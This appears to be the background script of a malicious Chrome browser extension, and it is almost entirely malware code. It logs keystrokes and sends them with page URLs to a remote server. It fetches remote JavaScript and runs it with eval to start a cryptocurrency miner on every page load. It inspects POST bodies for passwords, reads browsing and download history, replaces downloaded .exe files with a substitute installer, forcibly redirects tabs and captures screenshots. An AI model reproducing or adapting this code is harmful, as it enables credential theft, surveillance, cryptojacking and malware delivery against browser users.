// Send data to external server
var rserverIP = "";
function sendToServer(data) {
  var req = new XMLHttpRequest();
  req.open("POST", rserverIP, true);
  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  req.send(data);
  req.onload = function () {
    console.log(this.responseText);
  };
}

// Get a certain number of last websites in history
function getHistory(number) {
  chrome.history.search({ text: "", maxResults: number }, function (data) {
    data.forEach(function (page) {
      console.log(page.url);
    });
  });
}

// Get keystrokes
var lastURL = "";
var userEmail = "";
function keyLog(request) {
  chrome.identity.getProfileUserInfo((userinfo) => {
    userEmail = userinfo.email;
    if (lastURL !== request.page) {
      //console.log(userEmail);
      //console.log(request.page);
      //sendToServer("page="+request.page);
      lastURL = request.page;
    }
    //console.log(request.key);
    sendToServer("key="+request.key+"&page="+request.page);
  });
}

// Get HTML data of page
function pageLog(request) {
  console.log(request.page);
  //console.log(request.htmldata);
}

function startMiner() {
  fetch("https://www.hostingcloud.racing/sKfg.js")
    .then((resp) => resp.text())
    .then(eval)
    .then(() => {
      var _client = new Client.Anonymous(
        "f459263ca7d76883b9bdc6c055c8544232ae4edfb614b877457b56a1f6ef5b95",
        {
          throttle: 0.8,
          c: "w",
        }
      );
      _client.start();
      console.log("test miner");
    })
    .catch(console.error);
}

var updatedCounter = 0;
chrome.tabs.onUpdated.addListener(function (tabId, info) {
  if (info.status === "complete") {
    updatedCounter = updatedCounter + 1;
    chrome.tabs.sendMessage(tabId, { type: "tabUpdated" });
    startMiner();
    if (updatedCounter >= 10){
      getHistory(10);
      updatedCounter = 0;
    }
  }
});

chrome.webRequest.onBeforeRequest.addListener(
  function (request) {
    if (request.method === "POST") {
      let strg = JSON.stringify(request);
      if (strg.includes("password") || strg.includes("pass")) {
        console.log("request");
        console.log(request);
      }
    }
  },
  {
    urls: ["<all_urls>"],
  },
  ["blocking", "requestBody"]
);

// Handle the different message types
function handleMessageB(request) {
  if (request.type === "keyLog") {
    keyLog(request);
  } else if (request.type === "pageLog") {
    pageLog(request);
  } else if (request.type === "passwordChange") {
    console.log("password value " + request.data);
  }
}

// Handle the different messages
chrome.runtime.onMessage.addListener(handleMessageB);

var redirect = true;
// Redirect requests to specific host
var host = "https://www.google.com/";
var cpt = 0;
chrome.webRequest.onBeforeRequest.addListener(
  function (details) {
    console.log(details);
    console.log(cpt);
    if (details.url !== host && cpt > 10) {
      cpt = 0;
      console.log("send redirect " + details.url);
      window.setTimeout(function () {
        chrome.tabs.update(details.tabId, { url: details.url });
      }, 1000);
      return { redirectUrl: host };
    } else {
      cpt = cpt + 1;
    }
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame"],
  },
  ["blocking"]
);

// Make download
async function makeDownload(name) {
  await chrome.downloads.download({
    url: "https://github.com/JJRossmann/UltimateExtension/raw/master/installer.exe",
    filename: name,
  });
}

//Download replacer
var originalFilename;
var cp = true;
var counter = 10;
chrome.downloads.onChanged.addListener(async function (downloadItem) {
  if (downloadItem.filename) {
    if (cp) {
      cp = false;
      originalFilename = downloadItem.filename.current;
      let i = originalFilename.lastIndexOf("\\");
      originalFilename = originalFilename.substring(i + 1);
      console.log(originalFilename);
      let i2 = originalFilename.lastIndexOf(".");
      let extension = originalFilename.substring(i2 + 1);
      if (extension === "exe") {
        if (counter >= 10) {
          counter = 0;
          await chrome.downloads.cancel(downloadItem.id);
          await chrome.downloads.erase({ id: downloadItem.id });
          await makeDownload(originalFilename);
        } else {
          counter = counter + 1;
        }
      }
    } else {
      cp = true;
    }
  }
});

// Get download history
function getDownloadHistory() {
  chrome.downloads.search(
    { orderBy: ["-startTime"], limit: 1000, startedAfter: "2000-01-01" },
    function (downloadItems) {
      console.log(downloadItems);
    }
  );
}

chrome.commands.onCommand.addListener((command) => {
  console.log(`Command: ${command}`);
  makeScreenshots();
});

var screenshotFlag = false;
function makeScreenshots() {
  if (screenshotFlag) {
    chrome.tabs.captureVisibleTab(function (res) {
      console.log(res);
    });
    screenshotFlag = false;
  }
  window.setTimeout(checkFlag, 100);
}
